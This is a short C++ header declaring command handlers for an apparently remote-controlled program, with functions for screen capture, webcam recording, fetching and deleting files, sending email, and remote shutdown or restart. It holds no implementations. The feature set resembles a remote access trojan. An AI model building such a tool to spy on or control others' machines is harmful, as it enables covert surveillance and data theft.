#pragma once
#include <iostream>
using namespace std;

void helpCommand(const string& command, const string& accessToken, const string& sender);

void ipconfigCommand(const string& command, const string& accessToken, const string& sender);

void screenCaptureCommand(const string& command, const string& accessToken, const string& sender);

void getFileCommand(const string& accessToken, const string& sender);
void getFileCommand(const string& command, const string& accessToken, const string& sender);

void deleteFileCommand(const string& accessToken, const string& sender);
void deleteFileCommand(const string& command, const string& accessToken, const string& sender);

void webcamRecorder(const string & accessToken, const string& sender);
void webcamRecorder(const string & command, const string& accessToken, const string& sender);

void sendEmailCommand(const string& command, const string& accessToken, const string& sender);

void unknownCommand(const string& command, const string& accessToken, const string& sender);

void shutdownCommand(const string& command, const string& accessToken, const string& sender);

void restartCommand(const string& command, const string& accessToken, const string& sender);

void refreshToken();

void waiting();

